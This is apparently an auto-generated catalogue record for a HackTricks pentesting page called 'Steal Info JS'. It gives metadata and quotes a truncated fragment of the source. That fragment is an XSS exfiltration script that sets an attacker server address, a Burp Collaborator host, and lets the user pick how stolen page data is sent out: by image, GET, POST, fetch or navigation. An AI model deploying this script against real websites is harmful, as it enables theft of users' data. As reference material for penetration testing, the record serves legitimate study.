...
| Record ID | `hacktricks-pentesting-web-xss-cross-site-scripting-steal-info-js` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/xss-cross-site-scripting/steal-info-js.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Steal Info JS](../../topics/pentesting-web/steal-info-js.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-pentesting-web-xss-cross-site-scripting-steal-info-js |
| name | Steal Info JS |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/xss-cross-site-scripting/steal-info-js.md |

## Preserved Source Material

````yaml
_body: "# Steal Info JS\n\n{{#include ../../banners/hacktricks-training.md}}\n\n```javascript\n// SELECT HERE THE EXFILTRATION\
  \ MODE (more than 1 can be selected)\n// If any GET method is selected (like location or RQ_GET), it's recommended to exfiltrate\
  \ each info 1 by 1\nvar ATTACKER_SERVER =\n  \"https://weecosb5a2k7jc0cwlyksg9qzh57tw.burpcollaborator.net\"\nvar EXFIL_BY_IMG\
  \ = false\nvar EXFIL_BY_RQ_GET = false\nvar EXFIL_BY_RQ_POST = true\nvar EXFIL_BY_FETCH_GET = false\nvar EXFIL_BY_FETCH_POST\
  ...
  \ exfil_by_img(info_name, text)\n  if (EXFIL_BY_RQ_GET) exfil_by_rq_get(info_name, text)\n  if (EXFIL_BY_RQ_POST) exfil_by_rq_post(info_name,\
  \ text)\n  if (EXFIL_BY_FETCH_GET) exfil_by_fetch_get(info_name, text)\n  if (EXFIL_BY_FETCH_POST) exfil_by_fetch_post(info_name,\
  \ text)\n  if (EXFIL_BY_NAV) exfil_by_nav(info_name, text)\n  if (EXFIL_BY_LOC) {\n    if (is_final) exfil_by_loc(info_name,\
...
_relative_path: pentesting-web/xss-cross-site-scripting/steal-info-js.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/xss-cross-site-scripting/steal-info-js.md
````
